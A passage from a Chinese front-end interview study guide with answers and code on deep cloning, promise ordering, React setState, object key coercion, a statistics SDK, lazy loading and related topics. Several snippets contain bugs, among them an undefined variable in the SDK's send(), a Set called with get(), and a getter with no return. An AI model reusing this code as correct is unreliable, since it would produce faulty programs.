            this.dataLength++

            if (this.dataLength === 1) this.listHead = newNode
        } else {
            // 修改现有数据
            curNode.value = value
            // 移动到末尾
            this.moveToTail(curNode)
        }

        // 尝试清理长度
        this.tryClean()
    }
}
```
## 53、手写JS深拷贝
手写JS深拷贝，考虑Map，Set，循环引用。
如果使用JSON.parse和JSON.stringify，则会有以下问题：
* 无法转换函数
* 无法转换Map、Set
* 无法转换循环引用

另外Object.assign是浅拷贝。weakMap是弱引用，不会影响垃圾回收，不会造成内存泄露。
```js
/**
 * 深拷贝
 * @param obj obj
 * @param map weakmap 为了避免循环引用
 */
export function cloneDeep(obj: any, map = new WeakMap()): any {
    // 不是对象则直接返回
    if (typeof obj !== 'object' || obj == null) return obj

    // 避免循环引用
    const objFromMap = map.get(obj)
    if (objFromMap) return objFromMap

    let target: any = {}
    map.set(obj, target)

    // Map
    if (obj instanceof Map) {
        target = new Map()
        obj.forEach((v, k) => {
            const v1 = cloneDeep(v, map)
            const k1 = cloneDeep(k, map)
            target.set(k1, v1)
        })
    }

    // Set
    if (obj instanceof Set) {
        target = new Set()
        obj.forEach(v => {
            const v1 = cloneDeep(v, map)
            target.add(v1)
        })
    }

    // Array
    if (obj instanceof Array) {
        target = obj.map(item => cloneDeep(item, map))
    }

    // Object
    for (const key in obj) {
        const val= cloneDeep(obj[key], map)
        target[key] = val
    }

    return target
}
```
## 54、根据一个 DOM 树，写出一个虚拟 DOM 对象
讲以下 DOM 结构转换为 vnode 数据
```html
<div id="div1" style="border: 1px solid #ccc; padding: 10px;">
    <p>一行文字<a href="xxx.html" target="_blank">链接</a></p>
    <img src="xxx.png" alt="图片" class="image"/>
    <button click="clickHandler">点击</button>
</div>
```
vdom 就是用 JS 对象的形式来表示 DOM 结构。vnode 即对应着 DOM 结构的一个 node 节点。
```js
const vnode = {
    tag: 'div', // <div>
    data: {
        id: 'div1',
        style: {
            'border': '1px solid #ccc',
            'padding': '10px'
        }
    },
    children: [
        {
            tag: 'p', // <p>
            data: {},
            children: [
                '一行文字',
                {
                    tag: 'a', // <a>
                    data: {
                        href: 'xxx.html',
                        target: '_blank'
                    },
                    children: ['链接']
                }
            ]
        },
        {
            tag: 'img', // <img>
            data: {
                className: 'image', // 注意，这里要用 className
                src: 'xxx.png',
                alt: '图片'
            }
        },
        {
            tag: 'button', // <button>
            data: {
                events: {
                    click: clickHandler
                }
            },
            children: ['点击']
        }
    ]
}
```
## 55、[1, 2, 3].map(parseInt) 输出结果
`parseInt(str,radix)`，解析一个字符串，并返回十进制整数。第一个参数str，即要解析的字符串。第二个参数radix，基数（进制），范围2-36。
例如 parseInt('11',2) 表示将2进制的'11'转换成十进制。
```js
const nums = ['1', '2', '3']
const res = nums.map((item, index) => {
    // item '1',index 0
    // item '2',index 1
    // item '3',index 2
    return parseInt(item, index)
})

parseInt('1', 0) // 0等价于没有传第二个参数，返回1
parseInt('2', 1) // 1是不存在的进制，没法解析，返回NaN
parseInt('3', 2) // 2进制里面没有'3'，没法解析，返回NaN
```
所以最终结果是1、NaN、NaN。
## 56、函数修改形参，能否影响实参
```js
function changeArg(x) {
    x = 200
}
let num = 100
changeArg(num)
console.log('changeNum', num); // 100

let obj = { name: 'zls' }
changeArg(obj)
console.log('changeObj', obj); // { name: 'zls' }
```
函数参数，是赋值传递，所以不会变。
```js
const obj = { name: 'zls' }
let obj1 = obj  
obj1 = 200  // 要注意，对obj1进行赋值不会影响到obj，结果还是{ name: 'zls' }
obj1.name = '200' // 如果是这样改则会影响到obj
``` 
## 57、数组转树、树转数组、数组转对象、对象转数组
手写convert，把一个数组转换为树。
```js
const arr = [
    { id: 1, name: '部门A', parentId: 0 },
    { id: 2, name: '部门B', parentId: 1 },
    { id: 3, name: '部门C', parentId: 1 },
    { id: 4, name: '部门D', parentId: 2 },
    { id: 5, name: '部门E', parentId: 2 },
    { id: 6, name: '部门F', parentId: 3 },
]
```
![image](/blog/images/question-8-18.png)

思路：遍历数组，每个元素，生成tree node，找到parentNode，并加入它的children。

如何找parentNode？遍历数据太慢，可用一个Map来维护关系，便于查找。
### 数组转树
```js
// 数组每项
interface IArrayItem {
    id: number
    name: string
    parentId: number
}

// 树节点
interface ITreeNode {
    id: number
    name: string
    children?: ITreeNode[]
}

function convert(arr: IArrayItem[]): ITreeNode | null {
    // 用于 id 和 treeNode 的映射
    const idToTreeNode: Map<number, ITreeNode> = new Map()

    let root = null

    arr.forEach(item => {
        const { id, name, parentId } = item

        // 定义 tree node 并加入 map
        const treeNode: ITreeNode = { id, name }
        idToTreeNode.set(id, treeNode)

        // 找到 parentNode 并加入到它的 children
        const parentNode = idToTreeNode.get(parentId)
        if (parentNode) {
            if (parentNode.children == null) parentNode.children = []
            parentNode.children.push(treeNode)
        }

        // 找到根节点
        if (parentId === 0) root = treeNode
    })

    return root
}
console.log(convert(arr))
```
### 数组转对象
```js
function convert(arr) {
    const mapInfo = new Map()  // 保存id和节点的映射
    let target
    arr = arr.sort((a, b) => {
        return a.parentId - b.parentId
    })
    arr.forEach(item => {
        const { id, name, parentId } = item
        const curNode = { id, name }
        mapInfo.set(id, curNode) // 保存id和节点的映射
        // 根据id获取节点
        const parent = mapInfo.get(parentId)
        if (parent) {
            if (!parent.children) {
                parent.children = []
            }
            parent.children.push(curNode)
        }
        // parentId==0，说明当前节点就是最顶层的节点
        if (parentId == 0) {
            target = mapInfo.get(id)
        }
    });
    return target
}
console.log(convert(arr));
```
### 树转数组
```js
const tree = {
    id: 1,
    name: '部门A',
    children: [
        {
            id: 2,
            name: '部门B',
            children: [
                { id: 4, name: '部门D' },
                { id: 5, name: '部门E' }
            ]
        },
        {
            id: 3,
            name: '部门C',
            children: [
                { id: 6, name: '部门F' }
            ]
        }
    ]
}
```
将上面这棵树转成数组

思路：使用广度优先遍历，用队列。为什么？因为广度优先遍历的结果和数组元素的顺序正好一致。将树节点转成Array item，push到数组里。根据父子关系，找到ArrayItem的parentId。

如何找到parentId？遍历树去查找，太慢。可用一个Map维护关系，便于查找。
```js
interface IArrayItem {
    id: number
    name: string
    parentId: number
}

interface ITreeNode {
    id: number
    name: string
    children?: ITreeNode[]
}

function convert1(root: ITreeNode): IArrayItem[] {
    // Map
    const nodeToParent: Map<ITreeNode, ITreeNode> = new Map()

    const arr: IArrayItem[] = []

    // 广度优先遍历，queue
    const queue: ITreeNode[] = []
    queue.unshift(root) // 根节点 入队

    while (queue.length > 0) {
        const curNode = queue.pop() // 出队
        if (curNode == null) break

        const { id, name, children = [] } = curNode

        // 创建数组 item 并 push
        const parentNode = nodeToParent.get(curNode)
        const parentId = parentNode?.id || 0
        const item = { id, name, parentId }
        arr.push(item)

        // 子节点入队
        children.forEach(child => {
            // 映射 parent
            nodeToParent.set(child, curNode)
            // 入队
            queue.unshift(child)
        })
    }

    return arr
}
console.log(convert1(tree))
```
### 对象转数组
```js
function converToArr(obj) {
    const arr = []
    const queue = [] // 队列，用来广度优先遍历
    const mapInfo = new Map() // 保存父子关系，避免循环
    queue.unshift(obj)
    while (queue.length > 0) {
        const curNode = queue.pop()
        const { id, name, children = [] } = curNode
        // 找父节点
        const parentNode = mapInfo.get(curNode)
        const parentId = parentNode?.id || 0
        arr.push({ id, name, parentId })
        // 遍历子节点
        children.forEach(child => {
            queue.unshift(child)
            mapInfo.set(child, curNode)  // 保存父子关系
        })
    }
    return arr
}

console.log(converToArr(tree));
```
## 58、构造函数和原型的重名属性
```js
function Foo() {
    Foo.a = function () { console.log(1); }
    this.a = function () { console.log(2); }
}
Foo.prototype.a = function () { console.log(3); }
Foo.a = function () { console.log(4); }

Foo.a()   // 4
let obj = new Foo()
obj.a()  // 2
Foo.a()  // 1
```
## 59、promise-then执行顺序问题
### then交替执行
如果有多个fulfilled promise实例，同时执行then链式调用，then会交替执行，这是编译器的优化，防止一个promise占用太久时间。
```js
Promise.resolve().then(() => {
    console.log(1);
}).then(() => {
    console.log(2);
}).then(() => {
    console.log(3);
})

Promise.resolve().then(() => {
    console.log(10);
}).then(() => {
    console.log(20);
}).then(() => {
    console.log(30);
})

Promise.resolve().then(() => {
    console.log(100);
}).then(() => {
    console.log(200);
}).then(() => {
    console.log(300);
})
// 会按顺序交替输出1、10、100、2、20、200、3、30、300。
```
### then中返回promise实例会慢两拍
then中返回promise实例，相当于多出一个promise实例，也会遵循“交替执行”，但和直接声明一个promise实例，会出现“慢两拍”的效果。第一拍，promise需要由pending转为fulfilled，第二拍，then函数挂载到MicroTaskQueue里。
```js
Promise.resolve().then(() => {
    console.log(1);
    return Promise.resolve(100)
}).then((res) => {
    console.log(res);
}).then(() => {
    console.log(200);
}).then(() => {
    console.log(300);
}).then(() => {
    console.log(400);
}).then(() => {
    console.log(500);
})

Promise.resolve().then(() => {
    console.log(10);
}).then(() => {
    console.log(20);
}).then(() => {
    console.log(30);
}).then(() => {
    console.log(40);
}).then(() => {
    console.log(50);
})
// 会输出 1、10、20、30、100、40、200、50、300、400、500。
```
输出20和30就是因为慢两拍。相当于下面的
```js
Promise.resolve().then(() => {
    console.log(1);
})

Promise.resolve().then(() => {
    console.log(10);
}).then(() => {
    console.log(20);
}).then(() => {
    console.log(30);
}).then(() => {
    console.log(40);
}).then(() => {
    console.log(50);
})

// 会慢两拍。。。
Promise.resolve().then(() => {
    // 第一拍，将Promise转为fulfilled状态
    const p = Promise.resolve(100)
    // 第二拍，把后面的then函数挂载到微任务队列里
    Promise.resolve().then(() => {
        p.then(res => {
            console.log(res);
        }).then(() => {
            console.log(200);
        }).then(() => {
            console.log(300);
        }).then(() => {
            console.log(400);
        }).then(() => {
            console.log(500);
        })
    })
})
```
## 60、React-setState经典面试题
### setState异步更新
默认情况：setState默认异步更新，且会合并后更新。
```js
componentDidMount() {
    // this.state.val 初始值是0
    this.setState({ val: this.state.val + 1 }) 
    console.log(this.state.val)  // 0

    this.setState({ val: this.state.val + 1 })
    console.log(this.state.val)  // 0
}
```
多个setState会合并后更新，即后面的setState会覆盖前者的setState。
```js
componentDidMount() {
    // this.state.val 初始值是0
    this.setState({ val: this.state.val + 1 })
    console.log(this.state.val) // 输出0，因为是异步更新

    // setState第二个参数里可以获取最新结果
    this.setState({ val: this.state.val + 100 }, () => {
      console.log('newVal', this.state.val); // 输出100，因为会合并后更新，后面的会覆盖前面的。
    })
    console.log(this.state.val) // 输出0，因为是异步更新
}
```
### setState同步更新
setState的同步更新，不在React上下文中触发。比如在setTimeout、setInterval、Promise.then、自定义DOM事件、Ajax回调。
```js
componentDidMount() {
    // this.state.val 初始值是0
    this.setState({ val: this.state.val + 1 })
    console.log(this.state.val)  // 0

    this.setState({ val: this.state.val + 1 })
    console.log(this.state.val)  // 0

    setTimeout(() => {
        // 此时val的值是1
        this.setState({ val: this.state.val + 1 }) // 在setTimeout里会同步更新
        console.log(this.state.val)  // 2

        this.setState({ val: this.state.val + 1 })
        console.log(this.state.val)  // 3
    }, 0); 
}
```
### 何时setState不合并
不会合并，意思就是多个setState，后面的不会覆盖前面的。

* setState同步更新时
* setState传入函数时
```js
  componentDidMount() {
    // 传入函数，setState不会合并，即后面的不会覆盖前面的
    this.setState((prevState, props) => {
      return { val: prevState.val + 1 }
    })
    console.log('a----', this.state.val) // 0

    this.setState((prevState, props) => {
      return { val: prevState.val + 1 }
    })
    console.log('b----', this.state.val) // 0

    setTimeout(() => {
      // 这里val的值是2，因为上面的setState不会合并
      this.setState({ val: this.state.val + 1 })
      console.log('c----', this.state.val) // 3

      this.setState({ val: this.state.val + 1 })
      console.log('d----', this.state.val) // 4
    }, 0)
  }
```
### setState是微任务还是宏任务
* setState本质是同步，只不过让React做成了异步的样子，因为要考虑性能，多次setState修改，只进行一次DOM渲染
* setState是同步执行，state都是同步更新，即在微任务Promise.then开始之前，state都已经计算完了
* 结论：同步任务，不是微任务和任务

同步更新：
```js
componentDidMount() {
    // 初始this.state.val为0
    setTimeout(() => {
        console.log('--- start ---')

        Promise.resolve().then(() => console.log('promise then'))

        this.setState({ val: this.state.val + 1 })
        console.log('val...', this.state.val)  // 1

        console.log('--- end ---')
    })
}

// 输出：
// --- start ---
// val... 1
// --- end ---
// promise then
```
异步更新时，setState的回调会在合并完以后、微任务之前执行，本质还是同步任务。
```js
import React from 'react'

class Example extends React.Component {
  constructor() {
    super()
    this.state = {
      val: 0
    }
  }

  // 点击事件后，是异步更新
  clickHandler = () => {
    console.log('--- start ---')

    Promise.resolve().then(() => console.log('promise then') )

    // “异步”，本质还是同步，只不过要先合并，再执行callback。
    this.setState(
      { val: this.state.val + 1 },
      () => { console.log('val...', this.state.val) } // 1  callback
    )

    console.log('--- end ---')
  }

  render() {
    return <p id="p1" onClick={this.clickHandler}>
      setState demo: {this.state.val}
    </p>
  }
}

export default Example

// 输出：
// --- start ---
// --- end ---
// val... 1
// promise then
```
## 61、对象和属性的连续赋值
* 连续赋值，倒序执行
```js
let n1, n2
n1 = n2 = 100
console.log(n1, n2); // 输出100,100，相当于n2=100、n1=n2
```
* a.x比赋值的优先级高
```js
let a = { n: 1 }
a.x = a = { n: 2 }
// 可拆解为
// a.x=undefined   初始化a.x属性
// let x=a.x   // x变量是假想的，实际不会有
// x=a={ n: 2 }  
```

看题：
```js
let a = { n: 1 }
let b = a
a.x = a = { n: 2 }
console.log(a.x);  // undefined
console.log(b.x);  // {n:2}
console.log(a);  // { n: 2 }
console.log(b);  // { n: 1, x: { n: 2 } }
```
![image](/blog/images/question-8-19.png)
## 62、对象属性类型的问题
* 数字作为对象属性key时，会转成字符串。
```js
let a = {}, b = '123', c = 123
a[b] = 'b'
a[c] = 'c'
console.log(a[b]);  // c
console.log(a);  // { '123': 'c' }
```
* Symbol作为对象属性key时，会转成Symbol字符串。
```js
let a = {}, b = Symbol('123'), c = Symbol('123')
a[b] = 'b'
a[c] = 'c'
console.log(a[b]);  // b
console.log(a);  // { [Symbol(123)]: 'b', [Symbol(123)]: 'c' }
```
* 对象作为对象属性key时，会转成`'[object Object]'`字符串。
```js
let a = {}, b = { key: '123' }, c = { key: '456' }
a[b] = 'b'
a[c] = 'c'
console.log(a[b]);  // c
console.log(a);  // { '[object Object]': 'c' }
```
* 数组作为对象属性key时，会转成由数组元素逗号连接起来的字符串。空数组时就是空字符串
```js
let a = {}, b = [1, 2, 3], c = [1, 2, 3, 5]
a[b] = 'b'
a[c] = 'c'
console.log(a[b]);  // b
console.log(a);  // { '1,2,3': 'b', '1,2,3,5': 'c' }
```

总结：JS对象key的数据类型，只能是字符串和Symbol类型，其它类型会被转成字符串，使用字符串会调用它的toString()方法。

扩展：
* Map的key可以是任意类型。
* WeakMap的key只能是引用类型，不能是值类型。弱引用，不会造成内存泄露。
## 63、如何设计一个前端统计SDK
前端统计的范围：
* 访问量PV，页面访问量
* 自定义事件
* 性能、错误
```js
const PV_URL_SET = new Set()

class MyStatistic {
    constructor(productId) {
        this.productId = productId

        this.initPerformance() // 性能统计
        this.initError() // 错误监控
    }

    // 发送统计数据
    send(url, params = {}) {
        params.productId = this.productId

        const paramArr = []
        for (let key in params) {
            const val = params[key]
            paramArr.push(`${key}=${value}`)
        }

        const newUrl = `${url}?${paramArr.join('&')}` // url?a=10&b=20

        // 用 <img> 发送：1. 可跨域；2. 兼容性非常好
        const img = document.createElement('img')
        img.src = newUrl // get
    }

    // 初始化性能统计
    initPerformance() {
        const url = 'yyy'
        this.send(url, performance.timing) // 给最原始的、完整的结果，原始数据
    }

    // 初始化错误监控
    initError() {
        window.addEventListener('error', event => {
            const { error, lineno, colno } = event
            this.error(error, { lineno, colno })
        })
        // Promise 未 catch 住的报错
        window.addEventListener('unhandledrejection', event => {
            this.error(new Error(event.reason), { type: 'unhandledrejection' })
        })
    }

    pv() {
        const href = location.href
        if (PV_URL_SET.get(href)) return // 不重复发送 pv

        this.event('pv')

        PV_URL_SET.add(href)
    }

    event(key, val) {
        const url = 'xxx' // 自定义事件统计 server API
        this.send(url, { key, val })
    }

    error(err, info = {}) {
        const url = 'zzz'
        const { message, stack } = err
        this.send(url, { message, stack, ...info })
    }
}

const s = new MyStatistic('a1') // DOMContentLoaded
s.pv() // SPA 路由切换 PV

s.event('vip', 'close')

try {
} catch(ex) {
    s.error(ex, {})
}
```
## 64、sourcemap有何作用，如何配置
JS上线时要压缩、混淆，但是线上的JS报错信息，将无法识别行、列。sourcemap就可以解决这个问题。原理就是sourcemap表示了源码和压缩后的代码之间对应的关系。webpack通过devtool配置sourcemap。
* eval  JS放在eval(...)中，不生成sourcemap文件
* source-map  生成单独的map文件，并在JS最后指定
* eval-source-map  JS放在eval(...)中，sourcemap内嵌
* inline-source-map  sourcemap内嵌到JS中
* cheap-source-map  sourcemap中只有行信息、没有列
* eval-cheap-source-map  同上，但是没有map文件

常用：
* 开发环境：eval、eval-source-map、eval-cheap-source-map
* 生产环境：source-map
## 65、SPA和MPA应该如何选择
SPA：单页面应用。MPA：多页面应用。默认情况下，Vue React都是SPA.

SPA特点：功能较多，一个页面展示不完。以操作为主，非展示为主，适合一个综合web应用。

MPA特点：功能较少，一个页面展示得完。以展示为主，操作较少，适合一个孤立的页面。

多页面webpack配置：
```js
/**
 * @description MPA webpack 配置
 * @author 双越老师
 */

const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');

module.exports = {
  mode: 'production',
  // 多入口
  entry: {
    home: './src/home/index.js',
    product: './src/product/index.js',
    about: './src/about/index.js'
  },
  output: {
    filename: 'js/[name].[contentHash].js', // name 即 entry 的 key
    path: path.resolve(__dirname, './dist')
  },
  plugins: [
    // 三个页面
    new HtmlWebpackPlugin({
      title: '首页',
      template: './template/index.html',
      filename: 'home.html',
      chunks: ['home']
    }),
    new HtmlWebpackPlugin({
      title: '产品',
      template: './template/product.html',
      filename: 'product.html',
      chunks: ['product']
    }),
    new HtmlWebpackPlugin({
      title: '关于',
      template: './template/about.html',
      filename: 'about.html',
      chunks: ['about']
    })
  ]
}
```
## 66、设计一个H5编辑器的数据模型和核心功能
* 组件应该是有序结构，属性应该参考Vnode设计
* 是用Vuex同步，但如何确定当前画布选中的组件
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>H5 editor</title>
</head>
<body>
    <p>H5 editor</p>
    <script>
        // // 问题1
        // const page = {
        //     // Array 有序
        //     components: {
        //         'text1': {
        //             type: 'text',
        //             value: '文本1',
        //             style: {
        //                 color: 'red',
        //                 fontSize: '16px',
        //             },
        //         },
        //         'text2': {
        //             type: 'text',
        //             value: '文本2',
        //             color: 'red',
        //             fontSize: '16px',
        //         },
        //         'img1': {
        //             type: 'image',
        //             src: 'xxx.png',
        //             width: '100px'
        //         }
        //     }
        // }

        // // 问题二：vuex 同步

        // // 问题三： 图层
        // {
        //     layers: [
        //         {
        //             id: 'text1',
        //             name: '文本1'
        //         },
        //         {
        //             id: 'text2', // component id
        //             name: '文本2' // layer name
        //         },
        //         {
        //             id: 'img1',
        //             name: '图片'
        //         },
        //     ]
        // }


        // 第一个问题
        const store = {
            page: {
                title: '标题',
                setting: { /* 其他扩展信息：多语言，微信分享的配置，其他 */ },
                props: { /* 当前页面的属性设置，背景 */ },
                components: [
                    // components 有序，数组

                    {
                        id: 'x1',
                        name: '文本1',
                        tag: 'text', // type
                        style: { color: 'red', fontSize: '16px' },
                        attrs: { /* 其他属性 */ },
                        text: '文本1',
                    },
                    {
                        // 文本2
                    },
                    {
                        id: 'x3',
                        name: '图片1',
                        tag: 'image',
                        style: { width: '100px' },
                        attrs: { src: 'xxx.png' }
                    }
                ]
            },

            // 问题2 Vuex
            // 用于记录当前选中的组件，记录 id 即可
            activeComponentId: 'x3'
        }

        // 问题3 Vuex getters
        const getters = {
            // Vue computed
            layers() {
                store.page.components.map(c => {
                    return {
                        id: c.id,
                        name: c.name
                    }
                })
            }
        }

    </script>
</body>

</html>
```
## 67、设计一个“用户-角色-权限”的模型和功能
RBAC，基于角色的访问控制。用户和角色之间关系，角色和权限之间关系。
![image](/blog/images/question-8-20.png)

* 用户管理：增删改查，绑定角色
* 角色管理：增删改查，绑定权限
* 权限管理：增删改查
## 68、简单描述hybrid模板的更新流程
![image](/blog/images/question-8-21.png)
## 69、B 端和 C 端有和区别
* B 端，即 toB - to Business 面向商业、生产者
* C 端，即 toC - to Customer 面向消费者、终端用户
### B端
B 端一般是对内的管理系统。

大厂会自研很多内部管理平台、运营平台，供自己人使用。还有一些公司是专门为企业提供内部管理系统的，如 OA CMS ERP 财务软件等。

管理系统一般用于专业的业务领域，所以功能都非常复杂。这就需要复杂的组件设计，拆分和抽离，要深入熟悉业务才能更好的制作技术方案。
所以，B 端系统一般都是业务驱动的，业务运营人员的话语权更重。

但它的流量不会太大，一般后台一个服务器、一个数据库即可满足。而且用户环境比较单一，网络情况好，不用考虑极致的性能优化、浏览器兼容性等。
### C端
C 端一般是对外的落地页，就是我们日常消费的各种新闻、小视频页面。

这代表着这个公司对外的核心业务，也是公司最核心的产品，一般都会自研、不会购买或者外包。

C 端系统一般都是民用级别的，不会有什么复杂专业的功能。

但它的流量一般很大，后台可能需要很多服务器集群，需要各种 CDN 和缓存。而且，它的用户群体很不固定，手机、浏览器、网络等都不确定，需要全面的性能优化和统计、监控。

所以，C 端一般是技术驱动的，技术人员话语权很重。

大型互联网公司内部的企业文化，技术人员话语权大，也是因为他们 C 端产品比较多，而且 C 端是核心产品。
### SaaS
SaaS - Software as a service 软件即服务，它集合了 B 端和 C 端。

例如常见的腾讯文档、在线画图软件、在线 PS 等。他们既有 B 端的复杂功能，又有 C 端面向终端用户的特点。SaaS 的研发成本是非常高的。
## 70、开发一个H5抽奖页，需要后端提供哪些接口
* 登录，获取用户信息，用户是否已经抽奖
* 抽奖接口
* 统计接口，微信JSSDK信息
## 71、如果你是前端技术负责人，将如何做技术选型
* 前端框架：Vue、React

技术选型的依据：社区是否成熟、公司是否已经有经验积累、团队成员的学习成本。
## 72、设计实现一个H5图片懒加载SDK
* 定义 `<img src="loading.png" data-src="xxx.png">`
* 页面滚动，图片露出时，将data-src赋值給src
* 滚动要节流
* 元素的位置ele.getBoundingClientRect()
* 图片top和window.innerHeight比较大小
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>img lazy load</title>
    <style>
        .item-container {
            border-top: 1px solid #ccc;
            margin-bottom: 30px;
        }

        .item-container img {
            width: 100%;
            border: 1px solid #eee;
            border-radius: 10px;
            overflow: hidden;
        }
    </style>
</head>

<body>
    <h1>img lazy load</h1>

    <div class="item-container">
        <p>新闻标题</p>
        <img src="./img/loading.gif" data-src="./img/animal1.jpeg" />
    </div>

    <div class="item-container">
        <p>新闻标题</p>
        <img src="./img/loading.gif" data-src="./img/animal2.webp" />
    </div>

    <div class="item-container">
        <p>新闻标题</p>
        <img src="./img/loading.gif" data-src="./img/animal3.jpeg" />
    </div>

    <div class="item-container">
        <p>新闻标题</p>
        <img src="./img/loading.gif" data-src="./img/animal4.webp" />
    </div>

    <div class="item-container">
        <p>新闻标题</p>
        <img src="./img/loading.gif" data-src="./img/animal5.webp" />
    </div>

    <div class="item-container">
        <p>新闻标题</p>
        <img src="./img/loading.gif" data-src="./img/animal6.webp" />
    </div>

    <script src="https://cdn.bootcdn.net/ajax/libs/lodash.js/4.17.21/lodash.min.js"></script>
    <script>
        function mapImagesAndTryLoad() {
            const images = document.querySelectorAll('img[data-src]')
            if (images.length === 0) return

            images.forEach(img => {
                const rect = img.getBoundingClientRect()
                if (rect.top < window.innerHeight) {
                    // 露出来
                    // console.info('loading img', img.dataset.src)
                    img.src = img.dataset.src
                    img.removeAttribute('data-src') // 移除 data-src 属性，为了下次执行时减少计算成本
                }
            })
        }

        window.addEventListener('scroll', _.throttle(() => {
            mapImagesAndTryLoad()
        }, 100))

        mapImagesAndTryLoad()
    </script>
</body>

</html>
```
## 73、JS各种宽高（clientHeight、scrollHeight、offsetHeight、document.body.clientHeight、window.innerHeight等）

